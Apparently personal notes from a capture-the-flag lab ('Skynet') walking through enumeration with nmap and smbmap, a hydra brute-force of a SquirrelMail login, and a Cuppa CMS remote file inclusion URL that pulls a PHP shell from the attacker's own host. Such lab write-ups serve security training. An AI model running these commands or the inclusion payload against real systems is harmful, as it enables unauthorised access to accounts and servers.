# foothold
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 16:24 EDT
Nmap scan report for 10.10.11.22
Host is up (0.19s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL SASL AUTH-RESP-CODE PIPELINING RESP-CODES TOP CAPA
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: more OK ID post-login LOGINDISABLEDA0001 ENABLE LITERAL+ listed Pre-login capabilities SASL-IR IMAP4rev1 LOGIN-REFERRALS have IDLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m57s, deviation: 2h53m12s, median: -3s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2020-05-04T15:25:02-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:                                                                                                                                                                                            
|   2.02:                                                                                                                                                                                                        
|_    Message signing enabled but not required                                                                                                                                                                   
| smb2-time:                                                                                                                                                                                                     
|   date: 2020-05-04T20:25:02                                                                                                                                                                                    
|_  start_date: N/A                                                                                                                                                                                              
                                                                                                                                                                                                                 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                   
Nmap done: 1 IP address (1 host up) scanned in 55.28 seconds 

* Run dirbuster
/admin/ gets 403 now allowed
/config/ gets 403
/squirrelmail/ available

* Run SMBMAP
pat@kali:~/Desktop/Cert_Prep/thm/skynet$ smbmap -u anon -H 10.10.11.22
[+] Guest session       IP: 10.10.11.22:445     Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))

* Mount anonymous
sudo mount -r -t cifs //10.10.11.22/anonymous anonymous_mount/

* Read file
pat@kali:~/Desktop/Cert_Prep/thm/skynet/anonymous_mount$ cat attention.txt                                                                                                                                       
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.                                                            
-Miles Dyson

* log1.txt
pat@kali:~/Desktop/Cert_Prep/thm/skynet/anonymous_mount$ cat logs/log1.txt
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator

- Seems to have a bunch of passwords, maybe one is right? 

pat@kali:~/Desktop/Cert_Prep/thm/skynet$ hydra -l milesdyson -P pw_list.txt 10.10.11.22 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:password incorrect"
gives PW

- login to squirrelmail 
-- find pw reset email
We have changed your smb password after system malfunction.
Password: <>

- mount share
pat@kali:~/Desktop/Cert_Prep/thm/skynet$ smbmap -u milesdyson -H 10.10.11.22 -s milesdyson -p $milesdysonpw
[+] IP: 10.10.11.22:445 Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              READ ONLY       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))

pat@kali:~/Desktop/Cert_Prep/thm/skynet$ sudo mount -r -t cifs //10.10.11.22/milesdyson -o username=milesdyson,password=$milesdysonpw miles_mount/

pat@kali:~/Desktop/Cert_Prep/thm/skynet$ cat miles_mount/notes/important.txt 

1. Add features to beta CMS <>
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

- Scan new directory
find /administrator/

- search for exploits
pat@kali:~/Desktop/Cert_Prep/thm/skynet$ searchsploit cuppa
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                                          |  Path
                                                                                                                                                                        | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                                                                         | exploits/php/webapps/25971.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result

# Access
http://10.10.11.22/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.2.238/phpshell.php?

# Escalate
see crontrab running - can't change that script
maybe some tar cf 
https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

# Win
